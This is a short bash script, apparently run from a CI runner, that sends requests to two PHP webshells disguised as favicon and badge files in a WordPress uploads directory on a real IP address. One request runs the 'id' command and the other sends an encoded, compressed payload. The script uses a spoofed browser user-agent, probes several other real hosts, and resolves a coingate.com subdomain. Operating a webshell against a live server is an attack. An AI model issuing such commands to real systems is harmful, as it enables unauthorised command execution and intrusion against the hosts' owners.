#!/bin/bash
set -u
echo "=== runner egress ==="; curl -4 -s -m 10 https://api.ipify.org; echo
probe(){ u="$1"; echo "--- $u"; code=$(curl -sS -m 25 -A 'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 Chrome/131.0.0.0 Safari/537.36' -o /tmp/b -w 'HTTP:%{http_code} time:%{time_total} size:%{size_download}' "$u" 2>&1) ; echo "$code"; head -c 500 /tmp/b 2>/dev/null; echo; }
echo "=== webshell + controls from GitHub runner ==="
probe 'http://34.90.149.110/wp-content/uploads/2026/11/cg-favicon-32.php?z3k9=id'
probe 'http://34.90.149.110/wp-content/uploads/2026/11/cg-badge-64.php?q7x2=eJxLTc7IV1AK9nD18fH31lXSC%2FAIiA9zDQr29PezBgB3kQgZ'
probe 'http://34.90.149.110/'
probe 'http://52.57.35.253/'
probe 'http://3.72.21.192/'
probe 'http://13.205.26.100/'
echo "=== DNS blogv2 ==="; getent hosts blogv2.coingate.com || echo NXDOMAIN
echo "=== DONE-PROBE-222941 ==="
